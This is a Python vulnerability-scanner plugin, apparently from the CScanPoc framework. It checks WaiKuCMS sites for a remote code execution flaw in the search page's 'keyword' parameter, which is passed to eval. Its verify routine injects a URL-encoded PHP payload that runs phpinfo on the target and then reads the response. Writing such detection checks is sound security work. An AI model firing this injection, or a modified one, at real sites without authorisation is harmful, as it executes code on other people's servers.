# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WaiKuCMS_0101' # 平台漏洞编号，留空
    name = 'WaiKuCMS /index.php/Search.html 代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-10-11'  # 漏洞公布时间
    desc = '''
    Search.html 参数 keyword会在一定条件下会带入eval函数，构造代码可造成代码执行。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2010-048523
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WaiKuCMS(歪酷)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4e3c0c7d-3dcf-4467-8c88-544a6cf6022d' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            vul_url = self.target+'/index.php/search.html?keyword=%24%7B%40phpinfo%28%29%7D'
            response = urllib2.urlopen(urllib2.Request(vul_url)).read()
            if '<title>phpinfo()</title>' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()